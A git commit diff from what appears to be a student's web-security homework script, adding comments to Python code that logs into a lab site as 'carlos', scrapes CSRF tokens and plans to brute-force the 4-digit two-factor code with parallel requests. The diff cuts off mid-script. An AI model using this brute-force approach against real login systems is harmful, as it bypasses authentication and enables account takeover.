5ea467bc3905659772b65a3c0058070660169395
bradlet <bradlet2@pdx.edu>
2022-01-22 23:50:02 -0800

    Add comments explaining initial code and solution plan

--- personal_work_dir/pycharm_project/1.4/hw1/hw1.py
+++ personal_work_dir/pycharm_project/1.4/hw1/hw1.py
@@ -7,12 +7,15 @@ site = sys.argv[1]
 if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
 
+# First:
+# GET login page to find value of cross-site request forgery token.
 s = requests.Session()
 login_url = f'https://{site}/login'
 resp = s.get(login_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
 csrf = soup.find('input', {'name': 'csrf'}).get('value')
 
+# Login to user we have credentials for.
 logindata = {
     'csrf': csrf,
     'username': 'carlos',
@@ -22,9 +25,13 @@ print(f'Logging in as carlos:montoya')
 resp = s.post(login_url, data=logindata)
 print(f'Login response: {resp.text}')
 
+# Get next csrf token for interaction with 2fa (login2) endpoint.
 soup = BeautifulSoup(resp.text, 'html.parser')
 csrf = soup.find('input', {'name': 'csrf'}).get('value')
 
+# Send auth request to 2fa endpoint with csrf token and '0000'
+# Here's where we can split multiple processes that will all call a function
+# that makes this post with a different 4-digit code each time.
 login2_url = f'https://{site}/login2'
 login2data = {
     'csrf' : csrf,
